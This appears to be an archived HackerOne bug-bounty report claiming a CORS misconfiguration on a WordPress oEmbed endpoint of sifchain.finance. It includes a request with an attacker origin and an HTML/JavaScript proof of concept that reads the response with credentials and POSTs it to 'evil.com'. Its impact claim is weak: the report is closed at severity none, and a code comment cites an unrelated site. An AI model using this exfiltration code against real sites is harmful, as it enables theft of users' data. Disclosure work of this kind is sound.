# CORS misconfiguration

## Report Details
- **Report ID**: 1187543
- **URL**: https://hackerone.com/reports/1187543
- **State**: Closed
- **Severity**: none
- **Submitted**: 2021-05-07T08:18:20.124Z
- **Disclosed**: 2021-06-29T23:12:42.882Z

## Reporter
- **Username**: legacy_defender
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sifchain

## Vulnerability Information
##Description: Affected website: https://sifchain.finance/wp-json/oembed/1.0/embed?url=https://sifchain.finance/&format=xml

##Step-by-step Reproduction :

1. Send this request:
```javascript
GET /wp-json/oembed/1.0/embed?url=https://sifchain.finance/&format=xml HTTP/1.1
Host: sifchain.finance
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36
Connection: close
Origin: https://hacker4help.com
Cookie: __cfduid=df42fbb7a21cec869772467a93a9a4b981620366449
```
2. Here you can see the response headers:
```javascript
Access-Control-Allow-Origin: https://hacker4help.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: 
```
3. So you can write exploit:
```javascript
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS PoC</h2>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://sifchain.finance/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsifchain.finance%2F&format=xml", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
4. Save file as .html and open in and see Sensitive Information.

###Reference Exploit used: Exploit WordPress-5.2.4-Cross-Origin-Resource-Sharing

###Suggested Mitigation/Remediation Actions:

FIX 1 - It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request.
Reference: https://github.com/WP-API/WP-API/issues/2338
FIX 2 - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp/") to a Not Found (404) or a Default Page.

## Impact

Cross Misconfiguration -Leakage Sensitive Information

## Attachments
- bandicam_2021-05-07_13-47-21-959.mp4
